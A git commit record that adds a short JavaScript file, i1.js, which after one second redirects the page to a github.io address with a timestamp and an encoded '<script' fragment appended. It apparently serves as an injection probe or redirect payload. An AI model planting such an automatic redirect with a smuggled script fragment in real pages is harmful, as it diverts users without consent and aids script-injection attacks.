041e20f794bf443ded32fb37856d83a3787ac6b7
iuuc <145624790+iuuc@users.noreply.github.com>
2023-12-31 09:56:21 +0800

    Create i1.js

---
+++ i1.js
@@ -0,0 +1,5 @@
+setTimeout(function() {
+    var timestamp = new Date().getTime();
+    var url = 'https://teezx.github.io./index.html' + '?' + timestamp + '%3Cscript';
+    location.href = url;
+}, 1000);
